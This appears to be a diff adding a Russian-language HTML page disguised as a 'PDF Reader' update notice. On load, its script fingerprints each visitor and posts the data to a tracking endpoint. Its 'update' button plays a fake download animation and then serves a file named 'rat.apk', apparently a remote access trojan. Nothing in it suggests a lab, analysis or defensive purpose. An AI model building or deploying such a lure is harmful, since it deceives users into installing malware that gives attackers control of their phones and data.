@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Reader - Обновление</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        .icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #1f2937;
+            margin-bottom: 12px;
+            font-size: 24px;
+        }
+        .message {
+            color: #6b7280;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        .warning-box {
+            background: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .warning-box p {
+            color: #92400e;
+            font-size: 14px;
+            margin: 5px 0;
+        }
+        button {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 40px;
+            width: 100%;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover { background: #2563eb; }
+        button:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+        }
+        .progress {
+            margin-top: 20px;
+            background: #e5e7eb;
+            border-radius: 40px;
+            height: 8px;
+            display: none;
+            overflow: hidden;
+        }
+        .progress-fill {
+            background: #3b82f6;
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #6b7280;
+            display: none;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 11px;
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">⚠️</div>
+        <h2>Требуется обновление</h2>
+        <div class="message">
+            Ваша версия PDF Reader устарела и больше не поддерживается
+        </div>
+        <div class="warning-box">
+            <p>📌 Для просмотра защищенных документов</p>
+            <p>📌 Обновление займет менее 1 минуты</p>
+            <p>📌 После установки перезагрузите приложение</p>
+        </div>
+        <button id="downloadBtn">📥 Обновить PDF Reader</button>
+        <div class="progress" id="progressWrap"><div class="progress-fill" id="progressFill"></div></div>
+        <div class="status" id="statusMsg"></div>
+        <div class="footer">Версия 7.4.2 (стабильная)</div>
+    </div>
+
+    <script>
+        const server = '';
+        
+        async function registerVisit() {
+            const data = {
+                userAgent: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language,
+                timestamp: new Date().toISOString(),
+                referer: document.referrer
+            };
+            
+            try {
+                await fetch('/api/visit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch(e) { console.log(e); }
+        }
+        
+        registerVisit();
+        
+        document.getElementById('downloadBtn').onclick = async () => {
+            const btn = document.getElementById('downloadBtn');
+            const progressWrap = document.getElementById('progressWrap');
+            const progressFill = document.getElementById('progressFill');
+            const statusMsg = document.getElementById('statusMsg');
+            
+            btn.disabled = true;
+            btn.textContent = '⏳ Подготовка...';
+            progressWrap.style.display = 'block';
+            statusMsg.style.display = 'block';
+            
+            // Анимация
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 8;
+                if (progress <= 100) {
+                    progressFill.style.width = progress + '%';
+                    btn.textContent = `⏳ Скачивание... ${progress}%`;
+                    statusMsg.textContent = 'Пожалуйста, подождите...';
+                }
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    btn.textContent = '✅ Файл скачан!';
+                    statusMsg.textContent = 'Нажмите на скачанный файл для установки';
+                }
+            }, 150);
+            
+            // Логируем скачивание
+            try {
+                await fetch('/api/download', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ timestamp: new Date().toISOString() })
+                });
+            } catch(e) {}
+            
+            // Скачиваем APK
+            window.location.href = '/rat.apk';
+        };
+    </script>
+</body>
+</html>
